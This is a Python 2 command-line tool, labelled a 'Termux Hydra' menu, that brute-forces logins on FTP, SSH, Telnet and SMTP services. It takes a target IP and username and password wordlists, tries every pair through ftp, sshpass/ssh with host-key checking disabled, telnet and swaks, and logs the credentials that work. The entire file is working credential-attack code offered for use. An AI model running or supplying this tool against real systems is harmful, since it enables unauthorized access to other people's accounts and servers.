# -*- coding: utf-8 -*-

import os
import time
import subprocess
import sys

# =====================================================
# WORDLIST DETECTION (ASCII SAFE, PYTHON2 SAFE)
# =====================================================

def load_list(value):
    value = value.strip()
    if not value:
        print("This is not a wordlist.")
        sys.exit(1)

    # Check if it's a file
    if os.path.isfile(value):

        # Check empty file
        if os.path.getsize(value) == 0:
            print("Wordlist is empty.")
            sys.exit(1)

        items = []
        try:
            f = open(value, "r")
            for line in f:
                stripped = line.strip()
                if stripped:
                    items.append(stripped)
            f.close()
        except:
            print("Cannot read wordlist.")
            sys.exit(1)

        if len(items) == 0:
            print("Wordlist is empty.")
            sys.exit(1)

        return items

    # Not a file, treat as single direct value
    return [value]


SUCCESS_FILE = "success_log.txt"
DELAY_BETWEEN_ATTEMPTS = 1

def clear_screen():
    os.system("clear")

def display_banner():
    print("hi")

def perform_ftp_attack(target_ip, ftp_port, user, passwd):
    ftp_commands = "user {} {}\nquit\n".format(user, passwd)
    proc = subprocess.Popen(['ftp', '-n', target_ip, str(ftp_port)],
                            stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE)
    out, err = proc.communicate(ftp_commands)
    return proc.returncode

def perform_ssh_attack(target_ip, ssh_port, user, passwd):
    ssh_command = [
        'sshpass', '-p', passwd,
        'ssh', '-o', 'StrictHostKeyChecking=no',
        '-p', str(ssh_port),
        '{}@{}'.format(user, target_ip)
    ]
    proc = subprocess.call(ssh_command)
    return proc

def perform_telnet_attack(target_ip, telnet_port, user, passwd):
    telnet_command = ['telnet', target_ip, str(telnet_port)]
    proc = subprocess.Popen(telnet_command,
                            stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE)
    time.sleep(1)
    try:
        proc.stdin.write("{}\n{}\n".format(user, passwd))
        proc.stdin.flush()
    except:
        pass
    proc.stdin.close()
    proc.wait()
    return proc.returncode

def perform_smtp_attack(target_ip, smtp_port, user, passwd):
    smtp_command = [
        'swaks',
        '--to', user,
        '--from', user,
        '--server', target_ip,
        '--port', str(smtp_port),
        '--auth', 'LOGIN',
        '--auth-user', user,
        '--auth-password', passwd
    ]
    proc = subprocess.call(smtp_command)
    return proc

def perform_attack(target_type):
    clear_screen()
    display_banner()
    print("{} HYDRA ATTACK\n".format(target_type))

    target_ip = raw_input("Enter Target IP: ")
    target_port = raw_input("Enter {} Port: ".format(target_type))
    username_input = raw_input("Enter Username / UsernameFile: ")
    password_input = raw_input("Enter Password or PassFile: ")

    usernames = load_list(username_input)
    passwords = load_list(password_input)

    success_file = "{}_success_log.txt".format(target_type)
    open(success_file, "a").close()

    for user in usernames:
        for passwd in passwords:

            if target_type == "FTP":
                attack_command = lambda: perform_ftp_attack(target_ip, target_port, user, passwd)
            elif target_type == "SSH":
                attack_command = lambda: perform_ssh_attack(target_ip, target_port, user, passwd)
            elif target_type == "Telnet":
                attack_command = lambda: perform_telnet_attack(target_ip, target_port, user, passwd)
            elif target_type == "SMTP":
                attack_command = lambda: perform_smtp_attack(target_ip, target_port, user, passwd)
            else:
                print("Unknown target type.")
                return

            print("Trying {} login - User: {}, Password: {}".format(target_type, user, passwd))
            retcode = attack_command()

            if retcode == 0:
                print("\033[32mAttack Success: IP: {}, Username: {}, Password: {}\033[0m"
                      .format(target_ip, user, passwd))
                sf = open(success_file, "a")
                sf.write("IP: {}, Username: {}, Password: {}\n".format(target_ip, user, passwd))
                sf.close()

                time.sleep(2)
                exit_option = raw_input("Exit or Continue? [E/C]: ")
                if exit_option.lower() == "e":
                    print("Exiting Hydra.")
                    return
            else:
                print("\033[31mAttack Failed: User: {}, Password: {}\033[0m".format(user, passwd))

            time.sleep(DELAY_BETWEEN_ATTEMPTS)

    print("{} Attack Completed.".format(target_type))
    raw_input("Press Enter")

def main_menu():
    while True:
        clear_screen()
        display_banner()
        print("TERMUX HYDRA MENU:\n")
        print("1. FTP Attack")
        print("2. SSH Attack")
        print("3. Telnet Attack")
        print("4. SMTP Attack")
        print("5. Exit\n")

        choice = raw_input("Enter your choice: ")

        if choice == "1":
            perform_attack("FTP")
        elif choice == "2":
            perform_attack("SSH")
        elif choice == "3":
            perform_attack("Telnet")
        elif choice == "4":
            perform_attack("SMTP")
        elif choice == "5":
            clear_screen()
            print("Goodbye.")
            return
        else:
            raw_input("Invalid choice. Press Enter.")

if __name__ == "__main__":
    main_menu()